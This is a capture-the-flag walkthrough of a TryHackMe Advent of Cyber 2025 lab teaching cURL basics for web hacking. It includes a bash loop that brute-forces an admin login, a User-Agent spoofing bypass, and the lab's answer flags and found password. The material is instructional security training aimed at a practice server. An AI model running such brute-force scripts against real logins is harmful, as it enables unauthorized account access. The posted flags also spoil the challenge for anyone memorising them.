---
title: TryHackMe Advent of Cyber 2025 Day 24
summary: Walkthrough of the TryHackMe Advent of Cyber 2025 Day 24 - Exploitation with cURL - Hoperation Eggsploit
date: 2025-12-24T17:40:00
categories:
  - walkthrough
tags:
  - web hacking
  - TryHackMe
  - ctf
  - AdventOfCyber2025
cover:
  image: /2025/aoc_2025_day_24/Advent_of_Cyber_2025_Day_24_cover.png
  hidden: false
  responsiveImages: true
draft: false
---

# Introduction
## The Story

>According to blue-team intel, the wormhole is held open by a control panel on the Evil Bunnies' web server. The team must shut it down first to cut off reinforcements before facing King Malhare.

>However, the terminal they have is bare. No Burp Suite, no browser, just a command prompt.

>But that's fine. The team will use the command line and cURL to speak HTTP directly: send requests, read responses, and find the endpoints that shut the portal.

## Learning Objectives

- Understand what HTTP requests and responses are at a high level.
- Use cURL to make basic requests (using GET) and view raw responses in the terminal.
- Send POST requests with cURL to submit data to endpoints.
- Work with cookies and sessions in cURL to maintain login state across requests.

## HTTP Requests Using cURL

>Applications, like our browsers, communicate with servers using HTTP (Hypertext Transfer Protocol). Think of HTTP as the language for asking a server for resources (pages, images, JSON data) and getting answers back.

>So if you want to access a website, your browser sends an **HTTP request** to the web server. If the request is valid, the server replies with an **HTTP response** that contains the data needed to display the website.

>In the absence of a browser, you can still speak HTTP directly from the command line. The simplest way is with cURL.

>`curl` is a command-line tool for crafting HTTP requests and viewing raw responses. It's ideal when you need precision or when GUI tools aren't available.

## Trying out cURL

>Once you have AttackBox ready. Open a command prompt and run the command below:

```shell-session
root@attackbox:~# curl http://10.82.180.165/
```

>What happens after running the command is that `curl` sends an `HTTP GET` request for the site's home page. An HTTP response is received containing the body, which is then printed in the terminal. Because this is a terminal, instead of rendering the webpage, what you'll see is the text representation of the page in HTML.

## Sending POST Requests

>Suppose you've found a login form whose **POST** target is `/post.php`. When you log in through a browser, it sends a **POST** request to the server containing the credentials you entered. We can simulate this directly from the terminal.

>A normal login form submission might look like this:

```shell-session
root@attackbox:~# curl -X POST -d "username=user&password=user" http://10.82.180.165/post.ph
```

>You should get the reply `Invalid credentials`.

>Here's what's happening:
>- `-X POST` tells cURL to use the POST method.
>- `-d` defines the data we're sending in the body of the request.
>- The data will be sent in URL-encoded format, which is the same as what HTML forms use.

>If the application expects additional fields, like a "Login" button or a CSRF token, they can be included too:

```shell-session
root@attackbox:~# curl -X POST -d "username=user&password=user&submit=Login" http://10.82.180.165/post.php
```

>To view exactly what the server returns (including headers and potential redirects), add the `-i` flag:

```shell-session
root@attackbox:~# curl -i -X POST -d "username=user&password=user" http://10.82.180.165/post.php
```

>If the site responds with a **Set-Cookie** header, that's a good sign, it means you've successfully logged in or at least triggered a session.

## Using Cookies and Sessions

>Once you log in, web applications use cookies to keep your session active. When you make another request with your browser, the cookie gets sent automatically, but with cURL, you need to handle it yourself.

>You can do this in two steps:

**Step 1: Save the cookies**

```shell-session
root@attackbox:~# curl -c cookies.txt -d "username=admin&password=admin" http://10.82.180.165/session.php
```

>- The `-c` option writes any cookies received from the server into a file (`cookies.txt` in this case).
>- You'll often see a session cookie like `PHPSESSID=xyz123`.

**Step 2: Reuse the saved cookies**

```shell-session
root@attackbox:~# curl -b cookies.txt http://10.82.180.165/session.php
```

>- The `-b` option tells cURL to send the saved cookies in the next request, just like a browser would.

>This is exactly how session replay testing works, by replaying valid cookies in separate requests.

## Automating Login and Performing Brute Force Using cURL

>Now that we can send POST requests and manage sessions, it's time to automate things. Let's simulate a brute-force attack against a weak login form.

>Start by creating a file called `passwords.txt` and place the following passwords inside it:

```text
admin123
password
letmein
secretpass
secret
```

>Then, create a simple bash loop called `loop.sh` to try each password against `bruteforce.php` and copy-paste the following code inside it:

```bash
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://10.82.180.165/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
```

>Then add the execute permission to the script and run it, as shown below:

```shell-session
root@attackbox:~# chmod +x loop.sh 
root@attackbox:~# ./loop.sh
```

>Here's how this works:
>- `$(cat passwords.txt)` reads each password from the file.
>- `curl -s` sends the login request silently (no progress meter).
>- The response is stored in a variable.
>- `grep -q` checks if the response contains a success string (like “Welcome”).
>- When found, it prints the working password and exits the loop.

>This exact method underpins tools like **Hydra**, **Burp Intruder**, and **WFuzz**. By doing it manually, you understand what's happening under the hood: a repetitive HTTP POST with variable data, waiting for a different response.

## Bypassing User-Agent Checks

>Some applications block cURL by checking the **User-Agent** header. For example, the server may reject requests with: `User-Agent: curl/7.x.x`

>To specify a custom user-agent, we can use the `-A` flag:

```shell-session
root@attackbox:~# curl -A "internalcomputer" http://10.82.180.165/ua_check.php
```

>To confirm the check:

```shell-session
root@attackbox:~# curl -i http://10.82.180.165/ua_check.php root@attackbox:~# curl -i -A "internalcomputer" http://10.82.180.165/ua_check.php
```

>If the first fails and the second succeeds, the UA check is working, and you've bypassed it by spoofing.

## Bonus Mission

>**This section is optional and applies only to the final bonus question. The instructions in this section do not apply to the regular questions. Feel free to skip it and proceed with the regular questions if you don’t intend to attempt it.**

>Before the final battle can begin, the wormhole must be closed to stop enemy reinforcements. The evil Easter bunnies operate a web control panel that holds it open. The blue team must identify endpoints, authenticate and obtain the operator token, and call the close operation.

>**Hint:** Use rockyou.txt when brute forcing for the password (only for the bonus mission). The PIN is between 4000 and 5000.

>**Server**: `http://10.82.180.165/terminal.php?action=panel`

# Questions

**Make a POST request to the `/post.php` endpoint with the username `admin` and the password `admin`. What is the flag you receive?** - `THM{curl_post_success}`

**Make a request to the `/cookie.php` endpoint with the username `admin` and the password `admin` and save the cookie. Reuse that saved cookie at the same endpoint. What is the flag your receive?** - `THM{session_cookie_master}`

**After doing the brute force on the `/bruteforce.php` endpoint, what is the password of the `admin` user?** - `secretpass` 

**Make a request to the `/agent.php` endpoint with the user-agent `TBFC`. What is the flag your receive?** - `THM{user_agent_filter_bypassed}`

**Bonus question: Can you solve the Final Mission and get the flag?** - Do this question alone ;)

# Conclusion
## The Final Battle Commences 

>With the wormhole closed, King Malhare no longer had access to his reinforcements. McSkidy looked to her fellow Wareville town members. The king would only be vulnerable for a moment. The time to strike was now!  
  
>“Charge!!!” McSkidy exclaimed.  
  
>McSkidy and the townspeople of Wareville began unloading a barrage of snowballs on the king’s bunny battalion. They quickly returned fire with egg projectiles. The skyline became a blur of snowballs and eggs, and McSkidy used this moment of chaos to sneak into the king’s throne room.  
  
>Just as McSkidy was about to gain entry, a voice stopped her.  
>“Not so fast,” giggled Sir Carrotbane.  
  
>He slowly approached McSkidy, who suddenly felt underprepared. Just when she thought she was out of luck, Sir Breachblocker III stepped in front of her.  
  
>“Go,” he simply said.  
  
>“Wh… what are you doing?” Sir Carrotbane stuttered.  
  
>“What I should have done a long time ago. What’s right!” Sir Breachblocker III slammed his shield into the snow and drew his sword.  
>“GO!” he shouted, turning to McSkidy.

## The End of the Road

>McSkidy seized the moment and ran into the king’s throne room, where she found King Malhare throwing a tantrum.  
  
>“WHERE ARE MY REINFORCEMENTS?!”  
  
>“They’re not coming, Malhare,” McSkidy affirmed. “It’s over. Wareville is ours. Now let’s see how you like being captive. Now!”  
  
>As she shouted, two Wareville town members sprang a cage on the king.  
  
>It was over. Thanks in large part to your efforts, McSkidy had been freed, and King Malhare had finally been stopped. Wareville was safe once again. The king was dethroned and sent to HopSec Prison along with his coconspirator, Sir Carrotbane. Sir Breachblocker III was pardoned for his part in stopping the king’s tyrannical plan and later became King Breachblocker.

>Congratulations on finishing Advent of Cyber and saving the day! From all of us at TryHackMe, have a Merry Soc-Mas and a “Hoppy” New Year!

Congratulations indeed, this AOC teached us many things, you can be proud of you ! 

Never stop learning.

[h0neyp0t](https://instagram.com/h0neyp0t.sec)